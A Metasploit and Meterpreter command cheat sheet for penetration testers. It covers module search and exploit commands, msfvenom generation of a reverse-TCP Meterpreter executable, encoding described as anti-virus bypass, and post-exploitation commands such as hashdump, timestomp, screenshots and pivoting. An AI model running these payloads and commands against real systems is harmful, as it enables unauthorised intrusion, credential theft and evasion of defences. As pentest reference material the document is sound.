#### Metasploit Cheat Sheet


The Metasploit Project is a computer security project that provides information on vulnerabilities, helping in the development of penetration tests and IDS signatures.

Metasploit is a popular tool used by pentest experts. I have prepared a document for you to learn.

## Metasploit :

###### Search for module:

```
msf > search [regex]
```

###### Specify and exploit to use:

```
msf > use exploit/[ExploitPath]
```

###### Specify a Payload to use:

```
msf > set PAYLOAD [PayloadPath]
```

###### Show options for the current modules:

```
msf > show options
```

###### Set options:

```
msf > set [Option] [Value]
```

###### Start exploit:

```
msf > exploit 
```

##### Useful Auxiliary Modules


###### Port Scanner:

```
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.0/24
msf > run
```

###### DNS Enumeration:

```
msf > use auxiliary/gather/dns_enum
msf > set DOMAIN target.tgt
msf > run
```

###### FTP Server:

```
msf > use auxiliary/server/ftp
msf > set FTPROOT /tmp/ftproot
msf > run
```

###### Proxy Server:

```
msf > use auxiliary/server/socks4
msf > run 
```

#### msfvenom :

The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode 
them. This tool replaces the former msfpayload and msfencode tools. Run with ‘'-l payloads’ to get a list of payloads.

```
$ msfvenom –p [PayloadPath]
–f [FormatType]
LHOST=[LocalHost (if reverse conn.)]
LPORT=[LocalPort]
```

Example :

Reverse Meterpreter payload as an executable and redirected into a file:

```
$ msfvenom -p windows/meterpreter/
reverse_tcp -f exe LHOST=10.1.1.1
LPORT=4444 > met.exe
```

Format Options (specified with –f) --help-formats – List available output formats
```
exe – Executable
pl – Perl
rb – Ruby
raw – Raw shellcode
c – C code
```

Encoding Payloads with msfvenom

The msfvenom tool can be used to apply a level of encoding for anti-virus bypass. Run with '-l encoders'
to get a list of encoders.

```
$ msfvenom -p [Payload] -e [Encoder] -f
[FormatType] -i [EncodeInterations]
LHOST=[LocalHost (if reverse conn.)]
LPORT=[LocalPort]
```

Example

Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:

```
$ msfvenom -p windows/meterpreter/
reverse_tcp -i 5 -e x86/shikata_ga_nai -f
exe LHOST=10.1.1.1 LPORT=4444 > mal.exe
```

### Metasploit Meterpreter

#### Base Commands: 

Display a summary of commands
```
? / help
```

Exit the Meterpreter session
```
exit / quit
```

Show the system name and OS type
```
sysinfo
```

Self-explanatory
```
shutdown / reboot
```


#### File System Commands:

Change directory
```
cd
```

Change directory on local (attacker's) machine
```
lcd
```

Display current working directory
```
pwd / getwd
```

Show the contents of the directory
```
ls
```

Display the contents of a file on screen()
```
cat
```

Move files to/from the target machine
```
download / upload
```

Make / remove directory
```
mkdir / rmdir
```

Open a file in the default editor (typically vi)
```
edit
```

##### Process Commands:

Display the process ID that Meterpreter is running inside.
```
getpid
```

Display the user ID that Meterpreter is running with.
```
getuid
```

Display process list.
```
ps
```

Terminate a process given its process ID.
```
kill
```

Run a given program with the privileges of the process the Meterpreter is loaded in.
```
execute
```

Jump to a given destination process ID
```
migrate
```

- Target process must have same or lesser privileges

- Target process may be a more stable process

- When inside a process, can access any files that process has a lock on.


##### Network Commands:

Show network interface information
```
ipconfig
```

Forward packets through TCP session
```
portfwd
```

Manage/view the system's routing table
```
route
```


##### Misc Commands:

Display the duration that the GUI of thetarget machine has been idle.
```
idletime
```

Enable/disable either the mouse or keyboard of the target machine.
```
uictl [enable/disable] [keyboard/mouse]
```

Save as an image a screenshot of the target machine.
```
screenshot
```


##### Addiional Modules:

Load the specified module
```
use [module]
```

Example:

Load the priv module
```
use priv
```

Dump the hashes from the box
```
hashdump
```

Alter NTFS file timestamps
```
timestomp
```

##### Managing Sessions

###### Multiple Exploitation: 

Run the exploit expecting a single session that is immediately backgrounded:

```
msf > exploit -z
```

Run the exploit in the background expecting one or more sessions that are immediately backgrounded:

```
msf > exploit –j
```

###### List all current jobs (usually exploit listeners):

```
msf > jobs –l
```

###### Kill a job:

```
msf > jobs –k [JobID]
```

##### Multiple Sessions:

###### List all backgrounded sessions:

```
msf > sessions -l
```

###### Interact with a backgrounded session:

```
msf > session -i [SessionID]
```

###### Background the current interactive session:

```
meterpreter > <Ctrl+Z>
or
meterpreter > background
```

###### Routing Through Sessions:

All modules (exploits/post/aux) against the target subnet mask will be pivoted through this session.

```
msf > route add [Subnet to Route To]
[Subnet Netmask] [SessionID]
```